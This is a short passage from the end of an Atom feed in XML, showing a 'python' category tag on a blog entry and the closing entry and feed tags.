      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
    
  </entry>
  
</feed>
